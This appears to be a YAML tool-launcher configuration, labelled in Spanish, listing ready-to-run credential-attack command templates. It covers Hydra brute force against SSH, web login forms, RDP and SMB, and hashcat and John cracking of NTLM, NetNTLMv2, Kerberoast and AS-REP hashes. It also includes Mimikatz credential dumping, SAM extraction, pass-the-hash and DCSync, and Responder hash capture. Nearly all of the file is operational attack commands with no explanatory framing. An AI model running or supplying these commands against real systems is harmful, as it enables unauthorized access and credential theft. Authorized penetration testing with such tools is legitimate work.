tools:
  - name: "Hydra - SSH Brute Force"
    description: "Fuerza bruta SSH con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} ssh -t {threads}"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "root"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: threads
        label: "Threads"
        type: text
        placeholder: "16"

  - name: "Hydra - HTTP POST Login"
    description: "Fuerza bruta formulario web POST con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} http-post-form \"{path}:{body}:{fail_str}\""
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "admin"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: path
        label: "Path del formulario"
        type: text
        placeholder: "/login.php"
      - name: body
        label: "Body POST"
        type: text
        placeholder: "username=^USER^&password=^PASS^"
      - name: fail_str
        label: "String de fallo"
        type: text
        placeholder: "Invalid credentials"

  - name: "Hydra - RDP Brute Force"
    description: "Fuerza bruta RDP con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} rdp -t 4"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"

  - name: "Hydra - SMB Brute Force"
    description: "Fuerza bruta SMB con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} smb"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"

  - name: "John the Ripper - Crackear hash"
    description: "Crackear fichero de hashes con John"
    command: "john {hashfile} --wordlist={wordlist} --format={format}"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "hashes.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: format
        label: "Formato hash"
        type: text
        placeholder: "NT"

  - name: "John - Mostrar credenciales crackeadas"
    description: "Ver hashes ya crackeados por John"
    command: "john {hashfile} --show"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "hashes.txt"

  - name: "Hashcat - NTLM Wordlist"
    description: "Crackear hashes NTLM con hashcat y wordlist"
    command: "hashcat -m 1000 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "ntlm.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - NTLM + Rules"
    description: "Crackear NTLM con reglas de mutacion"
    command: "hashcat -m 1000 -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "ntlm.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - NetNTLMv2"
    description: "Crackear capturas NetNTLMv2 (Responder)"
    command: "hashcat -m 5600 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero NetNTLMv2"
        type: text
        placeholder: "netntlmv2.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - Kerberoast (TGS)"
    description: "Crackear tickets TGS de Kerberoasting"
    command: "hashcat -m 13100 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero tickets TGS"
        type: text
        placeholder: "tgs_hashes.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - AS-REP Roast"
    description: "Crackear hashes AS-REP (Kerberos pre-auth disabled)"
    command: "hashcat -m 18200 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero AS-REP"
        type: text
        placeholder: "asrep.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Crunch - Generar wordlist custom"
    description: "Generar wordlist con patron especifico"
    command: "crunch {min} {max} {charset} -t {pattern} -o {output}"
    params:
      - name: min
        label: "Longitud minima"
        type: text
        placeholder: "8"
      - name: max
        label: "Longitud maxima"
        type: text
        placeholder: "12"
      - name: charset
        label: "Charset"
        type: text
        placeholder: "abcdefghijklmnopqrstuvwxyz0123456789"
      - name: pattern
        label: "Patron (@ = min, , = may, % = num, ^ = especial)"
        type: text
        placeholder: "Company@@@@"
      - name: output
        label: "Fichero salida"
        type: text
        placeholder: "custom.txt"

  - name: "CeWL - Wordlist desde web"
    description: "Generar wordlist a partir del contenido de una web"
    command: "cewl {url} -m {minlen} -w {output} --with-numbers"
    params:
      - name: url
        label: "URL objetivo"
        type: text
        placeholder: "http://192.168.1.10"
      - name: minlen
        label: "Longitud minima"
        type: text
        placeholder: "6"
      - name: output
        label: "Fichero salida"
        type: text
        placeholder: "cewl_words.txt"

  - name: "Mimikatz - Dump credenciales (sekurlsa)"
    description: "Volcar credenciales en memoria con Mimikatz"
    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
    params: []

  - name: "Mimikatz - Pass the Hash"
    description: "Autenticar con hash NTLM via Mimikatz"
    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe\" exit"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "CORP"
      - name: hash
        label: "Hash NTLM"
        type: text
        placeholder: "aad3b435b51404eeaad3b435b51404ee"

  - name: "Mimikatz - lsadump SAM"
    description: "Volcar hashes SAM con Mimikatz (requiere SYSTEM)"
    command: "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
    params: []

  - name: "Mimikatz - DCSync"
    description: "Replicar credenciales via DCSync"
    command: "mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:{user}\" exit"
    params:
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "corp.local"
      - name: user
        label: "Usuario objetivo"
        type: text
        placeholder: "krbtgt"

  - name: "Responder - Capturar NetNTLMv2"
    description: "Capturar hashes NetNTLMv2 con Responder"
    command: "responder -I {iface} -rdwv"
    params:
      - name: iface
        label: "Interfaz de red"
        type: text
        placeholder: "eth0"

  - name: "Identificar tipo de hash"
    description: "Identificar formato de hash con hashid"
    command: "hashid {hash}"
    params:
      - name: hash
        label: "Hash a identificar"
        type: text
        placeholder: "5f4dcc3b5aa765d61d8327deb882cf99"
